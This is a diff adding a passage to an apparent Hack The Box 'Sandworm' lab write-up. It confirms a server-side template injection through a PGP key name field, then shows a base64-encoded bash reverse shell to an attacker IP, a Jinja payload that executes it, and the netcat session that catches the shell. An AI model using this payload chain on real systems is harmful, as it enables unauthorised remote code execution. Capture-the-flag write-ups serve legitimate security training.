@@ -112,3 +112,42 @@ Afterwards, copy the private key on the next [page](http://www.2pih.com/pgp.html
 It's important to understand that we are conducting this test to assess what we can manipulate and, as we can see, we are able to manipulate the name.
 
 ![](../assets/images/htb-writeup-Sandworm/fotoWeb7.PNG)
+
+So, let's check if it's vulnerable to SSTI by changing the "Your name" parameter.
+
+The steps remain the same, we generate a new PGP key with the updated name.
+
+![](../assets/images/htb-writeup-Sandworm/fotoWeb8.PNG)
+
+Perfect! There's an SSTI.
+
+![](../assets/images/htb-writeup-Sandworm/fotoWeb10.PNG)
+
+**Intrusion**
+
+We encode the reverse shell in base64.
+
+```ruby
+❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'" | base64
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==
+```
+
+Now we will change the vulnerable SSTI parameter to the following payload.
+
+```ruby
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
+```
+![](../assets/images/htb-writeup-Sandworm/fotoWeb11.PNG)
+
+```ruby
+❯ sudo nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.23] from (UNKNOWN) [10.10.11.218] 46060
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+/usr/local/sbin/lesspipe: 1: dirname: not found
+atlas@sandworm:/var/www/html/SSA$ ls
+ls
+SSA
+atlas@sandworm:/var/www/html/SSA$ 
+```
